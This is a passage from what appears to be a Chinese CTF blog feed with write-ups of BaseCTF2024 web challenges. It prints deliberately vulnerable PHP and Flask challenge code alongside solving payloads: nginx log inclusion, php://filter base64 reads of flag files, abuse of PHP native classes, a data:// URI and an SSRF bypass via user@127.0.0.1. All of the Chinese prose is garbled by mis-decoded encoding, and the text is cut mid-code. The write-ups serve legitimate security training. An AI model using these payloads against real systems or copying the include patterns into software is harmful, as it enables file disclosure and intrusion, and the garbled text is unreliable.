function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// è¾“å‡ºï¼š05/20/2024</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF2024å¤ç°</title>
    <link href="/2025/11/30/BaseCTF2024%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/11/30/BaseCTF2024%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ»¤ä¸ªä¸åœ"><a href="#æ»¤ä¸ªä¸åœ" class="headerlink" title="æ»¤ä¸ªä¸åœ"></a>æ»¤ä¸ªä¸åœ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><br><span class="hljs-variable">$incompetent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;incompetent&#x27;</span>]; <br><span class="hljs-variable">$Datch</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Datch&#x27;</span>]; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$incompetent</span> !== <span class="hljs-string">&#x27;HelloWorld&#x27;</span>) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;å†™å‡ºç¨‹åºå‘˜çš„ç¬¬ä¸€è¡Œé—®å€™å§ï¼&#x27;</span>); <br>&#125; <br><br><span class="hljs-comment">//è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Ÿï¼Ÿï¼Ÿ </span><br><span class="hljs-variable">$required_chars</span> = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>]; <br><span class="hljs-variable">$is_valid</span> = <span class="hljs-literal">true</span>; <br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$required_chars</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$Datch</span>, <span class="hljs-variable">$char</span>) === <span class="hljs-literal">false</span>) &#123; <br>        <span class="hljs-variable">$is_valid</span> = <span class="hljs-literal">false</span>; <br>        <span class="hljs-keyword">break</span>; <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_valid</span>) &#123; <br><br>    <span class="hljs-variable">$invalid_patterns</span> = [<span class="hljs-string">&#x27;php://&#x27;</span>, <span class="hljs-string">&#x27;http://&#x27;</span>, <span class="hljs-string">&#x27;https://&#x27;</span>, <span class="hljs-string">&#x27;ftp://&#x27;</span>, <span class="hljs-string">&#x27;file://&#x27;</span> , <span class="hljs-string">&#x27;data://&#x27;</span>, <span class="hljs-string">&#x27;gopher://&#x27;</span>]; <br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$invalid_patterns</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pattern</span>) &#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$Datch</span>, <span class="hljs-variable">$pattern</span>) !== <span class="hljs-literal">false</span>) &#123; <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?&#x27;</span>); <br>        &#125; <br>    &#125; <br><br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$Datch</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œå¹¶ä¸”ä¸å¯ä»¥é€šè¿‡ä¼ªåè®®æ¥è¿›è¡Œè¯»å–ï¼Œå®ƒæç¤ºæˆ‘ä»¬éœ€è¦åœ¨æäº¤ä¸­åŒ…å«ä¸€äº›å­—æ¯</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-symbol">&#x27;s</span>&#x27;, <span class="hljs-symbol">&#x27;e</span>&#x27;, <span class="hljs-symbol">&#x27;v</span>&#x27;, <span class="hljs-symbol">&#x27;a</span>&#x27;, <span class="hljs-symbol">&#x27;n</span>&#x27;, <span class="hljs-symbol">&#x27;x</span>&#x27;, <span class="hljs-symbol">&#x27;r</span>&#x27;, <span class="hljs-symbol">&#x27;o</span>&#x27;]<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºä¸èƒ½è¿›è¡Œå¸¸è§„çš„æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡åŒ…å«ä¸€äº›ç‰¹æ®Šçš„è·¯å¾„</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">incompetent=HelloWorld&amp;Datch=<span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/cookiescs/p/18696979">CTFShow-Web160ï¼šåˆ©ç”¨æ—¥å¿—åŒ…å«æ¼æ´è¿›è¡Œæ–‡ä»¶ä¸Šä¼  - Zebra233 - åšå®¢å›­</a></p><h1 id="æ•°å­¦å¤§å¸ˆ"><a href="#æ•°å­¦å¤§å¸ˆ" class="headerlink" title="æ•°å­¦å¤§å¸ˆ"></a>æ•°å­¦å¤§å¸ˆ</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>req = requests.session() <span class="hljs-comment">#å®ä¾‹åŒ–sessionå¯¹è±¡</span><br>url = <span class="hljs-string">&quot;http://challenge.imxbt.cn:32583/&quot;</span><br><br>answer = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    response = req.post(url , data=&#123;<span class="hljs-string">&quot;answer&quot;</span>: answer&#125;) <span class="hljs-comment">#POSTç­”æ¡ˆï¼Œè·å–å“åº”</span><br>    <span class="hljs-built_in">print</span>(response.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;BaseCTF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(response.text)<br>        <span class="hljs-keyword">break</span><br>    regex = <span class="hljs-string">r&quot; (\d*?)(.)(\d*)\?&quot;</span> <span class="hljs-comment">#æ­£åˆ™è¡¨è¾¾å¼</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, response.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;+&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) + <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;-&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) - <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;Ã—&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) * <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;Ã·&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) // <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/python3/python-requests.html">Python requests æ¨¡å— | èœé¸Ÿæ•™ç¨‹</a></p><p><a href="https://www.runoob.com/python/python-reg-expressions.html">Python æ­£åˆ™è¡¨è¾¾å¼ | èœé¸Ÿæ•™ç¨‹</a></p><h1 id="åœ£é’¥ä¹‹æˆ˜1-0"><a href="#åœ£é’¥ä¹‹æˆ˜1-0" class="headerlink" title="åœ£é’¥ä¹‹æˆ˜1.0"></a>åœ£é’¥ä¹‹æˆ˜1.0</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_json</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        json.loads(data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/static/index.html&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Read</span>():<br>    file = <span class="hljs-built_in">open</span>(__file__, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;J1ngHongè¯´ï¼šä½ æƒ³read flagå—ï¼Ÿ</span><br><span class="hljs-string">é‚£ä¹ˆåœ£é’¥ä¹‹å…‰å¿…å°†é˜»æ­¢ä½ ï¼</span><br><span class="hljs-string">ä½†æ˜¯å°å°çš„æºç æ²¡äº‹ï¼Œå› ä¸ºä½ ä¹Ÿè¯»ä¸åˆ°flag(ä¹)</span><br><span class="hljs-string"><span class="hljs-subst">&#123;file&#125;</span></span><br><span class="hljs-string">&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/pollute&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Pollution</span>():<br>    <span class="hljs-keyword">if</span> request.is_json:<br>        merge(json.loads(request.data),instance)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHongè¯´ï¼šé’¥åŒ™åœ£æ´æ— æš‡ï¼Œæ— äººå¯ä»¥æ±¡æŸ“ï¼&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHongè¯´ï¼šåœ£é’¥æš—æ·¡äº†ä¸€ç‚¹ï¼Œä½ å±…ç„¶æ±¡æŸ“æˆåŠŸäº†ï¼Ÿ&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><h1 id="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ"><a href="#flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ" class="headerlink" title="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ"></a>flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># æˆ‘æŠŠflagè—åœ¨ä¸€ä¸ªsecretæ–‡ä»¶å¤¹é‡Œé¢äº†ï¼Œæ‰€ä»¥è¦å­¦ä¼šéå†å•Š~</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$J1ng</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br><span class="hljs-variable">$Hong</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>];<br><span class="hljs-variable">$Keng</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;K&#x27;</span>];<br><span class="hljs-variable">$Wang</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;W&#x27;</span>];<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Keng</span>(<span class="hljs-variable">$Wang</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$J1ng</span>(<span class="hljs-variable">$Hong</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span><br>?K=GlobIterator<span class="hljs-variable">&amp;</span>W=glob:<span class="hljs-comment">///secret/*</span><br><span class="hljs-symbol">POST:</span><br>J=SplFileObject<span class="hljs-variable">&amp;</span>H=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=/secret/f11444g.php</span><br></code></pre></td></tr></table></figure><p><a href="https://www.qwesec.com/2023/10/phpBuilt-inClasses.html">CTFä¸­PHPåŸç”Ÿç±»çš„å¦™ç”¨</a></p><h1 id="Aura-é…±çš„ç¤¼ç‰©"><a href="#Aura-é…±çš„ç¤¼ç‰©" class="headerlink" title="Aura é…±çš„ç¤¼ç‰©"></a>Aura é…±çš„ç¤¼ç‰©</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Aura é…±ï¼Œæ¬¢è¿å›å®¶~</span><br><span class="hljs-comment">// è¿™é‡Œæœ‰ä¸€ä»½ç¤¼ç‰©ï¼Œè¯·ä½ ç­¾æ”¶ä¸€ä¸‹å“Ÿ~</span><br><span class="hljs-variable">$pen</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pen&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pen</span>) !== <span class="hljs-string">&#x27;Aura&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ç¤¼ç‰©æ”¶åˆ°å•¦ï¼Œæ¥ä¸‹æ¥è¦å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~</span><br><span class="hljs-variable">$challenge</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$challenge</span>, <span class="hljs-string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$blog_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$challenge</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$blog_content</span>, <span class="hljs-string">&#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;</span>) === <span class="hljs-literal">false</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// å˜¿å˜¿ï¼Œæ¥ä¸‹æ¥è¦æ‹†å¼€ç¤¼ç‰©å•¦ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œç¤¼ç‰©åœ¨ flag.php é‡Œé¢å“¦~</span><br><span class="hljs-variable">$gift</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gift&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$gift</span>); <br></code></pre></td></tr></table></figure><p>é¦–å…ˆå¯¹äºç¬¬ä¸€ä¸ªåˆ¤æ–­, ä»–éœ€è¦è¯»å–ä¸€ä¸ªæ–‡ä»¶åå†…å®¹æ˜¯ <code>Aura</code>,æˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡ <code>data://</code> ä¼ªåè®®æ¥è¿›è¡Œè¯»å–</p><p>åœ¨æ–‡ä»¶è¯»å–çš„æƒ…å†µä¸‹, åˆ©ç”¨ <code>data://</code> ä¼ªåè®®:</p><ul><li><code>data://text/plain,ä¸€ä¸²å†…å®¹</code> å¯ä»¥è¯»å–å‡º <code>ä¸€ä¸²å†…å®¹</code></li><li><code>data://text/plain;base64,xxxxxxxx</code> å…¶ä¸­ <code>xxxxxxx</code> ä¼šè¢« Base64 è§£ç åå†è¯»å–å‡ºå†…å®¹</li></ul><p>æ‰€ä»¥æˆ‘ä»¬æ­¤å¤„å¯ä»¥ä½¿ç”¨:</p><ul><li><code>data://text/plain,Aura</code></li><li><code>data://text/plain;base64,QXVyYQ==</code></li></ul><p>ç¬¬äºŒä¸ªåˆ¤æ–­çš„è¯, æˆ‘ä»¬è¦æ±‚é¡µé¢çš„å¼€å¤´ä¸º <code>http://jasmineaura.github.io</code></p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>@</code> æ¥è¿›è¡Œéš”æ–­, å°† <code>@</code> å‰é¢çš„å†…å®¹å½“åšç”¨æˆ·å (å‚è€ƒ <a href="https://cloud.tencent.com/developer/article/2288231">https://cloud.tencent.com/developer/article/2288231</a>)</p><p class="note note-primary">URL çš„æ ¼å¼ä¸º `scheme://user:password@address:port/path?query#fragment`</p><p>è€Œæˆ‘ä»¬éœ€è¦é¡µé¢çš„å†…å®¹å­˜åœ¨è¿™ä¸ªå­—ç¬¦ä¸², æˆ‘ä»¬å¯ä»¥å°±åˆ©ç”¨å½“å‰é¡µé¢æ¥æ˜¾ç¤º, äºæ˜¯æ„é€ </p><p><code>http://jasmineaura.github.io@127.0.0.1</code></p><p>ç¬¬ä¸‰ä¸ªçš„è¯æ˜¯ä¸€ä¸ª include ç‚¹, ç”±äºæˆ‘ä»¬çš„ flag åœ¨æ³¨é‡Šéƒ¨åˆ†, æˆ‘ä»¬éœ€è¦å°†å…¶ä¼ªåè®®å’Œè¿‡æ»¤å™¨æ¥è¿›è¡Œ base64 ç¼–ç åè¾“å‡º</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h4 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><p><a href="https://www.cnblogs.com/ya7q/p/19045966">SSRFå­¦ä¹ </a></p><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRFæ¼æ´åŸç†æ”»å‡»ä¸é˜²å¾¡(è¶…è¯¦ç»†æ€»ç»“)</a></p><h1 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># æˆ‘è®°å¾—å¥¹...å¥½åƒå«flag.phpå§ï¼Ÿ</span><br><span class="hljs-variable">$emp</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e_m.p&#x27;</span>];<br><span class="hljs-variable">$try</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;try&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$emp</span>!=<span class="hljs-string">&quot;114514&quot;</span>&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$emp</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">114514</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$emp</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$emp</span>[<span class="hljs-variable">$i</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ ä¸æ˜¯hackerï¼Ÿé‚£è¯·å»å¤–åœºç­‰å€™ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;åªæœ‰çœŸæ­£çš„hackeræ‰èƒ½æ‹¿åˆ°flagï¼&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="hljs-variable">$try</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ 